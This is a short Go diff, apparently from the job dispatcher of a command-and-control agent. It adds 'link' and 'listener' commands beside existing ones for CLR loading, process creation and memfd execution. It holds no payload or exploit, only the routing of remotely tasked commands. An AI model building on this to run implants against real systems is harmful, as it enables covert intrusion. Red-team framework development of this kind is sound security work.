@@ -72,6 +72,10 @@ func executeJob() {
 					result = commands.CLR(job.Payload.(jobs.Command))
 				case "createprocess":
 					result = commands.CreateProcess(job.Payload.(jobs.Command))
+				case "link":
+					result = commands.Link(job.Payload.(jobs.Command))
+				case "listener":
+					result = commands.Listener(job.Payload.(jobs.Command))
 				case "memfd":
 					result = commands.Memfd(job.Payload.(jobs.Command))
 				case "memory":
